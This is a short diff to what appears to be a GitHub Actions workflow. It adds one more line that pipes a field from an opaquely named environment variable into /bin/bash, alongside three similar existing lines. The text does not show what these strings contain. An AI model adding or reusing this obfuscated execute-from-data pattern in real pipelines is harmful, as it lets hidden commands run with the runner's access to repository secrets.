@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ve05" | jq -r .cmk567 | /bin/bash
           printf '%s' "$kmn4158" | jq -r .h851 | /bin/bash
           printf '%s' "$ecamn1" | jq -r .xsq58 | /bin/bash
+          printf '%s' "$xdv1307" | jq -r .r32 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
